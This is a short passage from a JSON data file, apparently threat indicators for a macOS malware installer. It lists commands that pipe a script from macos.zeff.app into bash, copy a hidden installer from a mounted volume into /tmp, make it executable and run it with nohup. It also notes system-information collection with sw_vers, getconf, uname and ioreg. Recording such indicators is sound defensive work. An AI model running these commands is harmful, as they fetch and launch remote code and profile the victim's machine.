    "curl -s 'https://macos.zeff.app/v2/install' | bash",
    "bash /Volumes/Zeff/Installer.file",
    "rm -rf /tmp/installer",
    "cp -r /Volumes/Zeff/.back/installer /tmp/installer",
    "chmod +x /tmp/installer",
    "nohup /tmp/installer",
    "sw_vers / getconf / uname / ioreg 系统信息收集"
  ],
  "paths": [
